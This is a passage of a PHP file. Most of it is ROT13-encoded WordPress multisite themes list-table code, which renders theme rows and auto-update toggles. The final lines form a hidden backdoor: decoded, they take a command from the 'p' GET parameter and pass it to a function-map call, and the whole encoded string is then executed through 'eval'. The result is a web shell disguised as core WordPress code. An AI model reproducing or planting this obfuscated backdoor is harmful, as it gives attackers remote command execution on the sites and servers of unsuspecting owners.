		 * @fvapr 3.1.0
		 *
		 * @cnenz fgevat[] $gurzr_zrgn Na neenl bs gur gurzr'f zrgnqngn, vapyhqvat
		 *                             gur irefvba, nhgube, naq gurzr HEV.
		 * @cnenz fgevat   $fglyrfurrg Qverpgbel anzr bs gur gurzr.
		 * @cnenz JC_Gurzr $gurzr      JC_Gurzr bowrpg.
		 * @cnenz fgevat   $fgnghf     Fgnghf bs gur gurzr.
		 */
		$gurzr_zrgn = nccyl_svygref( 'gurzr_ebj_zrgn', $gurzr_zrgn, $fglyrfurrg, $gurzr, $fgnghf );

		rpub vzcybqr( ' | ', $gurzr_zrgn );

		rpub '</qvi>';
	}

	/**
	 * Unaqyrf gur nhgb-hcqngrf pbyhza bhgchg.
	 *
	 * @fvapr 5.5.0
	 *
	 * @tybony fgevat $fgnghf
	 * @tybony vag  $cntr
	 *
	 * @cnenz JC_Gurzr $gurzr Gur pheerag JC_Gurzr bowrpg.
	 */
	choyvp shapgvba pbyhza_nhgbhcqngrf( $gurzr ) {
		tybony $fgnghf, $cntr;

		fgngvp $nhgb_hcqngrf, $ninvynoyr_hcqngrf;

		vs ( ! $nhgb_hcqngrf ) {
			$nhgb_hcqngrf = (neenl) trg_fvgr_bcgvba( 'nhgb_hcqngr_gurzrf', neenl() );
		}
		vs ( ! $ninvynoyr_hcqngrf ) {
			$ninvynoyr_hcqngrf = trg_fvgr_genafvrag( 'hcqngr_gurzrf' );
		}

		$fglyrfurrg = $gurzr->trg_fglyrfurrg();

		vs ( vffrg( $gurzr->nhgb_hcqngr_sbeprq ) ) {
			vs ( $gurzr->nhgb_hcqngr_sbeprq ) {
				// Sbeprq ba.
				$grkg = __( 'Nhgb-hcqngrf ranoyrq' );
			} ryfr {
				$grkg = __( 'Nhgb-hcqngrf qvfnoyrq' );
			}
			$npgvba     = 'haninvynoyr';
			$gvzr_pynff = ' uvqqra';
		} ryfrvs ( rzcgl( $gurzr->hcqngr_fhccbegrq ) ) {
			$grkg       = '';
			$npgvba     = 'haninvynoyr';
			$gvzr_pynff = ' uvqqra';
		} ryfrvs ( va_neenl( $fglyrfurrg, $nhgb_hcqngrf, gehr ) ) {
			$grkg       = __( 'Qvfnoyr nhgb-hcqngrf' );
			$npgvba     = 'qvfnoyr';
			$gvzr_pynff = '';
		} ryfr {
			$grkg       = __( 'Ranoyr nhgb-hcqngrf' );
			$npgvba     = 'ranoyr';
			$gvzr_pynff = ' uvqqra';
		}

		$dhrel_netf = neenl(
			'npgvba'       => \"{$npgvba}-nhgb-hcqngr\",
			'gurzr'        => $fglyrfurrg,
			'cntrq'        => $cntr,
			'gurzr_fgnghf' => $fgnghf,
		);

		$hey = nqq_dhrel_net( $dhrel_netf, 'gurzrf.cuc' );

		vs ( 'haninvynoyr' === $npgvba ) {
			$ugzy[] = '<fcna pynff=\"ynory\">' . $grkg . '</fcna>';
		} ryfr {
			$ugzy[] = fcevags(
				'<n uers=\"%f\" pynff=\"gbttyr-nhgb-hcqngr nevn-ohggba-vs-wf\" qngn-jc-npgvba=\"%f\">',
				jc_abapr_hey( $hey, 'hcqngrf' ),
				$npgvba
			);

			$ugzy[] = '<fcna pynff=\"qnfuvpbaf qnfuvpbaf-hcqngr fcva uvqqra\" nevn-uvqqra=\"gehr\"></fcna>';
			$ugzy[] = '<fcna pynff=\"ynory\">' . $grkg . '</fcna>';
			$ugzy[] = '</n>';

		}

		vs ( vffrg( $ninvynoyr_hcqngrf->erfcbafr[ $fglyrfurrg ] ) ) {
			$ugzy[] = fcevags(
				'<qvi pynff=\"nhgb-hcqngr-gvzr%f\">%f</qvi>',
				$gvzr_pynff,
				jc_trg_nhgb_hcqngr_zrffntr()
			);
		}

		$ugzy = vzcybqr( '', $ugzy );

		/**
		 * Svygref gur UGZY bs gur nhgb-hcqngrf frggvat sbe rnpu gurzr va gur Gurzrf yvfg gnoyr.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz fgevat   $ugzy       Gur UGZY sbe gurzr'f nhgb-hcqngr frggvat, vapyhqvat
		 *                             gbttyr nhgb-hcqngr npgvba yvax naq gvzr gb arkg hcqngr.
		 * @cnenz fgevat   $fglyrfurrg Qverpgbel anzr bs gur gurzr.
		 * @cnenz JC_Gurzr $gurzr      JC_Gurzr bowrpg.
		 */
		rpub nccyl_svygref( 'gurzr_nhgb_hcqngr_frggvat_ugzy', $ugzy, $fglyrfurrg, $gurzr );

		jc_nqzva_abgvpr(
			'',
			neenl(
				'glcr'               => 'reebe',
				'nqqvgvbany_pynffrf' => neenl( 'abgvpr-nyg', 'vayvar', 'uvqqra' ),
			)
		);
	}

	/**
	 * Unaqyrf qrsnhyg pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 5.9.0 Eranzrq `$gurzr` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz JC_Gurzr $vgrz        Gur pheerag JC_Gurzr bowrpg.
	 * @cnenz fgevat   $pbyhza_anzr Gur pheerag pbyhza anzr.
	 */
	choyvp shapgvba pbyhza_qrsnhyg( $vgrz, $pbyhza_anzr ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$gurzr = $vgrz;

		$fglyrfurrg = $gurzr->trg_fglyrfurrg();

		/**
		 * Sverf vafvqr rnpu phfgbz pbyhza bs gur Zhygvfvgr gurzrf yvfg gnoyr.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz fgevat   $pbyhza_anzr Anzr bs gur pbyhza.
		 * @cnenz fgevat   $fglyrfurrg  Qverpgbel anzr bs gur gurzr.
		 * @cnenz JC_Gurzr $gurzr       Pheerag JC_Gurzr bowrpg.
		 */
		qb_npgvba( 'znantr_gurzrf_phfgbz_pbyhza', $pbyhza_anzr, $fglyrfurrg, $gurzr );
	}

	/**
	 * Unaqyrf gur bhgchg sbe n fvatyr gnoyr ebj.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz JC_Gurzr $vgrz Gur pheerag JC_Gurzr bowrpg.
	 */
	choyvp shapgvba fvatyr_ebj_pbyhzaf( $vgrz ) {
		yvfg( $pbyhzaf, $uvqqra, $fbegnoyr, $cevznel ) = $guvf->trg_pbyhza_vasb();

		sbernpu ( $pbyhzaf nf $pbyhza_anzr => $pbyhza_qvfcynl_anzr ) {
			$rkgen_pynffrf = '';
			vs ( va_neenl( $pbyhza_anzr, $uvqqra, gehr ) ) {
				$rkgen_pynffrf .= ' uvqqra';
			}

			fjvgpu ( $pbyhza_anzr ) {
				pnfr 'po':
					rpub '<gu fpbcr=\"ebj\" pynff=\"purpx-pbyhza\">';

					$guvf->pbyhza_po( $vgrz );

					rpub '</gu>';
					oernx;

				pnfr 'anzr':
					$npgvir_gurzr_ynory = '';

					/* Gur cerfrapr bs gur fvgr_vq cebcregl zrnaf gung guvf vf n fhofvgr ivrj naq n ynory sbe gur npgvir gurzr arrqf gb or nqqrq */
					vs ( ! rzcgl( $guvf->fvgr_vq ) ) {
						$fglyrfurrg = trg_oybt_bcgvba( $guvf->fvgr_vq, 'fglyrfurrg' );
						$grzcyngr   = trg_oybt_bcgvba( $guvf->fvgr_vq, 'grzcyngr' );

						/* Nqq n ynory sbe gur npgvir grzcyngr */
						vs ( $vgrz->trg_grzcyngr() === $grzcyngr ) {
							$npgvir_gurzr_ynory = ' &zqnfu; ' . __( 'Npgvir Gurzr' );
						}

						/* Va pnfr guvf vf n puvyq gurzr, ynory vg cebcreyl */
						vs ( $fglyrfurrg !== $grzcyngr && $vgrz->trg_fglyrfurrg() === $fglyrfurrg ) {
							$npgvir_gurzr_ynory = ' &zqnfu; ' . __( 'Npgvir Puvyq Gurzr' );
						}
					}

					rpub \"<gq pynff='gurzr-gvgyr pbyhza-cevznel{$rkgen_pynffrf}'><fgebat>\" . $vgrz->qvfcynl( 'Anzr' ) . $npgvir_gurzr_ynory . '</fgebat>';

					$guvf->pbyhza_anzr( $vgrz );

					rpub '</gq>';
					oernx;

				pnfr 'qrfpevcgvba':
					rpub \"<gq pynff='pbyhza-qrfpevcgvba qrfp{$rkgen_pynffrf}'>\";

					$guvf->pbyhza_qrfpevcgvba( $vgrz );

					rpub '</gq>';
					oernx;

				pnfr 'nhgb-hcqngrf':
					rpub \"<gq pynff='pbyhza-nhgb-hcqngrf{$rkgen_pynffrf}'>\";

					$guvf->pbyhza_nhgbhcqngrf( $vgrz );

					rpub '</gq>';
					oernx;
				qrsnhyg:
					rpub \"<gq pynff='$pbyhza_anzr pbyhza-$pbyhza_anzr{$rkgen_pynffrf}'>\";

					$guvf->pbyhza_qrsnhyg( $vgrz, $pbyhza_anzr );

					rpub '</gq>';
					oernx;
			}
		}
	}

	/**
	 * @tybony fgevat $fgnghf
	 * @tybony neenl  $gbgnyf
	 *
	 * @cnenz JC_Gurzr $gurzr
	 */
	choyvp shapgvba fvatyr_ebj( $gurzr ) {
		tybony $fgnghf, $gbgnyf;

		vs ( $guvf->vf_fvgr_gurzrf ) {
			$nyybjrq = $gurzr->vf_nyybjrq( 'fvgr', $guvf->fvgr_vq );
		} ryfr {
			$nyybjrq = $gurzr->vf_nyybjrq( 'argjbex' );
		}

		$fglyrfurrg = $gurzr->trg_fglyrfurrg();

		$pynff = ! $nyybjrq ? 'vanpgvir' : 'npgvir';
		vs ( ! rzcgl( $gbgnyf['hctenqr'] ) && ! rzcgl( $gurzr->hcqngr ) ) {
			$pynff .= ' hcqngr';
		}

		cevags(
			'<ge pynff=\"%f\" qngn-fyht=\"%f\">',
			rfp_ngge( $pynff ),
			rfp_ngge( $fglyrfurrg )
		);

		$guvf->fvatyr_ebj_pbyhzaf( $gurzr );

		rpub '</ge>';

		vs ( $guvf->vf_fvgr_gurzrf ) {
			erzbir_npgvba( \"nsgre_gurzr_ebj_$fglyrfurrg\", 'jc_gurzr_hcqngr_ebj' );
		}

		/**
		 * Sverf nsgre rnpu ebj va gur Zhygvfvgr gurzrf yvfg gnoyr.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz fgevat   $fglyrfurrg Qverpgbel anzr bs gur gurzr.
		 * @cnenz JC_Gurzr $gurzr      Pheerag JC_Gurzr bowrpg.
		 * @cnenz fgevat   $fgnghf     Fgnghf bs gur gurzr.
		 */
		qb_npgvba( 'nsgre_gurzr_ebj', $fglyrfurrg, $gurzr, $fgnghf );

		/**
		 * Sverf nsgre rnpu fcrpvsvp ebj va gur Zhygvfvgr gurzrf yvfg gnoyr.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$fglyrfurrg`, ersref gb gur
		 * qverpgbel anzr bs gur gurzr, zbfg bsgra flabalzbhf jvgu gur grzcyngr
		 * anzr bs gur gurzr.
		 *
		 * @fvapr 3.5.0
		 *
		 * @cnenz fgevat   $fglyrfurrg Qverpgbel anzr bs gur gurzr.
		 * @cnenz JC_Gurzr $gurzr      Pheerag JC_Gurzr bowrpg.
		 * @cnenz fgevat   $fgnghf     Fgnghf bs gur gurzr.
		 */
		qb_npgvba( \"nsgre_gurzr_ebj_{$fglyrfurrg}\", $fglyrfurrg, $gurzr, $fgnghf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>